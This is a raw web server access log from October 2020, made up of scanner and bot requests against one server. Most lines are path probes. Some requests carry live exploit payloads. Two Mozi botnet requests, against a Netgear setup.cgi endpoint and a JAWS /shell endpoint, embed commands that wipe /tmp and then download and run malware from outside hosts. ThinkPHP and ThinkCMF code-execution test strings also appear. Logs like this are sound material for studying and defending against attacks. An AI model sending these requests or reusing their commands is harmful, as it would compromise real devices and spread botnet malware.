185.124.30.71 - - [13/Oct/2020:04:46:57 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:57 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:57 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:58 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:58 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:58 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:58 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:58 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:58 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:58 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:58 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:58 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:58 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:59 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:59 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:59 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:59 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:59 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:59 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:59 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:59 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:46:59 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:47:00 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:47:00 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:47:00 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.124.30.71 - - [13/Oct/2020:04:47:00 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
186.71.181.214 - - [13/Oct/2020:04:59:13 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0"
71.6.232.9 - - [13/Oct/2020:05:02:30 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
74.120.14.52 - - [13/Oct/2020:05:44:21 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
74.120.14.52 - - [13/Oct/2020:05:44:21 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
91.207.184.176 - - [13/Oct/2020:06:05:44 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
190.154.215.34 - - [13/Oct/2020:06:37:59 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0"
87.251.74.54 - - [13/Oct/2020:06:41:02 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"
125.45.185.175 - - [13/Oct/2020:07:17:15 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.45.185.175:34022/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 162 "-" "-"
47.115.166.149 - - [13/Oct/2020:07:24:43 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
175.184.164.134 - - [13/Oct/2020:07:37:04 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
119.118.21.10 - - [13/Oct/2020:07:37:04 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
106.45.0.221 - - [13/Oct/2020:07:37:05 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
104.208.164.39 - - [13/Oct/2020:07:46:14 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
104.208.164.39 - - [13/Oct/2020:07:46:14 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
101.113.224.180 - - [13/Oct/2020:07:52:09 +0000] "GET / HTTP/1.1" 400 166 "-" "-"
193.27.228.27 - - [13/Oct/2020:08:24:28 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [13/Oct/2020:08:29:46 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [13/Oct/2020:08:38:24 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [13/Oct/2020:08:41:45 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.254.59.113 - - [13/Oct/2020:08:56:52 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
170.80.63.205 - - [13/Oct/2020:09:10:53 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
87.251.74.54 - - [13/Oct/2020:09:44:30 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"
193.27.228.27 - - [13/Oct/2020:09:57:02 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
222.94.212.248 - - [13/Oct/2020:10:23:50 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)"
220.200.159.88 - - [13/Oct/2020:10:23:52 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)"
221.11.5.62 - - [13/Oct/2020:10:23:53 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)"
156.96.117.151 - - [13/Oct/2020:11:30:12 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
45.148.121.85 - - [13/Oct/2020:11:35:20 +0000] "HEAD /robots.txt HTTP/1.0" 404 0 "-" "-"
13.65.151.245 - - [13/Oct/2020:11:43:02 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.65.151.245 - - [13/Oct/2020:11:43:02 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.208.174.143 - - [13/Oct/2020:12:36:27 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
193.27.228.27 - - [13/Oct/2020:12:51:00 +0000] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [13/Oct/2020:13:04:28 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
125.45.48.47 - - [13/Oct/2020:13:15:56 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 162 "-" "-"
186.69.194.205 - - [13/Oct/2020:13:22:37 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0"
192.241.222.180 - - [13/Oct/2020:13:28:21 +0000] "GET /ReportServer HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
61.219.11.153 - - [13/Oct/2020:13:35:59 +0000] "\x01\x00\x00\x00" 400 166 "-" "-"
193.27.228.27 - - [13/Oct/2020:13:52:21 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
209.126.3.185 - - [13/Oct/2020:14:13:02 +0000] "GET / HTTP/1.1" 200 612 "-" "libwww-perl/6.49"
83.97.20.31 - - [13/Oct/2020:14:17:41 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
87.228.27.126 - - [13/Oct/2020:16:24:18 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
163.172.66.130 - - [13/Oct/2020:16:32:03 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01.\xA1\xE4)\xAA\x07\xD8\xEF\xC4\xE8\xC7$Oup\xABc\xCCl\xD7u-\x12\xB70\xD1\xD7\xFCs\xE4\x16y\x00\x00\x1E\xC0" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:32:09 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01\x12\x9A\xE5\xFD\xCE\x1C^\x96\xBC\x03\x22\x9CM-`\x9EL\xB5\xEA+\xEC\xE3lH\x95\xB4\x02\x09\xF4\xCE4c\x00\x00\x1E\xC0" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:32:09 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01\xDE?z%\x05\xA6\xB6]\xD2:<\xA3\x1A \x97\x10\x8E8\xFEO\xFA\x97\xE6\x94\xABU9nl\x91\x7Fw\x00\x00\x1E\xC0" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:32:09 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01\x86\x91\x8A$\x1A\x95\x0B\x91\x18j\x07\x8D'\xFDF\x09\x0E\xA3\xC0\x5Ca\xCC\xE2\xF1\xC7\xA3\xDF\xAE\x87n@\xA1\x00\x00\x1E\xC0" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:32:09 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01k\xAA\xEB\x22g\xAC\xDD<\xD8\xEC\xAA\x19\x92&\xE0\x1Aq\x1D\xA39A\x7F\xA7\xE4\xFEl\xD1\xB3L&\xCDW\x00\x00\x1E\xC0" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:32:11 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01.\xFA\x1A5t\xDB6\xDA-\xCBozm\x08\xEB\x84\xCA$\x9AK\xDF\x89\xAEf)~\x1D\x99P\x10\x90B\x00\x00\x1E\xC0" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:32:18 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01\xFE!\xF7R\xCB\xD75\xDB\xBE\xBA?w7\x0E\xB5K?\x16(\xBF\x12\xBA>\x22l5\x1A\x05\x19m\xF0\x1E\x00\x00\x1E\xC0" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:32:18 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01\xA0;\xB7a\xC8\xBA\x87I\xDB\xDF\xEC\xB2f\xF3\xBD\xE4\xD9\x18\x05\xDBT>v\xBD\xE9\x03\x9D\xE5M3\xFA\x8F\x00\x00\x1E\xC0" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:32:18 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01C\xE8\xFC\xE5\xB7\x87\xAA5\xC5\xC3\x1D\x16*\xB7C\xEBvh\xCA\x04\xC5\xBD\x0E\xCAy\xC1\x87\xEE\xE5=*\x97\x00\x00\x1E\xC0" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:32:18 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01n\xF8\xDF\xEAmX\xD1a\xAB\xD8rm\x5C\xE7ZO\xA1\xBA\xBF\xA3\xA3\xFA\x80\x1B8X7A8\x93\x0E\x8E\x00\x00\x1E\xC0" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:32:40 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01\x08\xAAB\x87T\xCCE]\x82\xAA\x1C\xD7\xA8G\x11\x09\x10\xEB\x8B)" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:32:48 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01r\xC8~&\xBD\xF9\xBC\xF34\x96!a\x10\x89\xA9\xEF\x81\xED\x83\xDC\x0C\xFExe\x9C\xD8\xF3\x87\x1AP\xC9\xBB\x00\x00\x1E\xC0" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:33:02 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x010n\x1E\xFE9\xCA\xB6.>\xBA\x1C\x00(3\xA1I\xA0\xE6\xF8\x9B\x8E\x83\xEC\x92\x06\xED\xEC)\xCC7\x84\x93\x00\x00\x1E\xC0" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:33:09 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01\x02\xFF\x0E\x1E\xD8T\xDF\xD3\x04\xE1\x11\xD0\xDD\x89-\x94\xC9\xED\xC8>D\x1B\x18\xC6\x990\xBCw]\x8E\xF7\xAA\x00\x00\x1E\xC0" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:33:18 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01\xE6\xB9K\x07\x8A\x99\xA0wm\x84\xFC\xBFB\x04\xD6\xA7\xFE\x1B?\xF5\x22\xFB%I\xA4\xD6y\xC1Kb\xCF\x15\x00\x00\x1E\xC0" 400 166 "-" "-"
163.172.66.130 - - [13/Oct/2020:16:33:27 +0000] "\x16\x03\x01\x00\x88\x01\x00\x00\x84\x03\x01S\xB9\xA8@\xEC\x02\xE3EX\xC1%\x82\xF8bK,\xDC\xD5n\xBEmvo\x8F\xCB\xA6\xD0\xBD\xB6\x04\xC1\x05\x00\x00\x1E\xC0" 400 166 "-" "-"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /phpmanager/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /php-my-admin/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /phpmyadmin1/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /phpMyAdmin2/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /phpMyAdmin3/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /phpMyAdmi/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /phpmy/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /phpMyAdmin-2/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /phpMyAdmin-3/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /admin/pma/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /mysql/db/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /PMA/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:31 +0000] "GET /sql/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:32 +0000] "GET /phpMyAdminold/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:32 +0000] "GET /phpmy-admin/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:32 +0000] "GET /db-admin/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:32 +0000] "GET /phpmy-admin/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:32 +0000] "GET /admin/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:32 +0000] "GET /sql/scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
104.244.75.112 - - [13/Oct/2020:17:21:32 +0000] "GET /scripts/setup.php HTTP/1.1" 404 134 "-" "ZmEu"
192.35.168.176 - - [13/Oct/2020:17:37:28 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 zgrab/0.x"
167.71.102.181 - - [13/Oct/2020:17:50:16 +0000] "\x00\x0E8\xDA\x9F\xD2Xq\xF1E\xF0\x00\x00\x00\x00\x00" 400 166 "-" "-"
192.241.232.7 - - [13/Oct/2020:17:58:55 +0000] "GET /hudson HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
167.248.133.51 - - [13/Oct/2020:18:22:13 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
167.248.133.51 - - [13/Oct/2020:18:22:13 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
178.73.215.171 - - [13/Oct/2020:18:28:30 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
119.99.49.138 - - [13/Oct/2020:19:53:18 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://119.99.49.138:54100/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 162 "-" "Hello, world"
193.118.53.210 - - [13/Oct/2020:21:21:33 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
125.24.84.224 - - [13/Oct/2020:23:04:35 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0"
192.241.216.242 - - [13/Oct/2020:23:14:11 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 zgrab/0.x"
193.27.228.27 - - [14/Oct/2020:00:40:45 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [14/Oct/2020:00:49:19 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [14/Oct/2020:01:01:02 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [14/Oct/2020:01:06:31 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
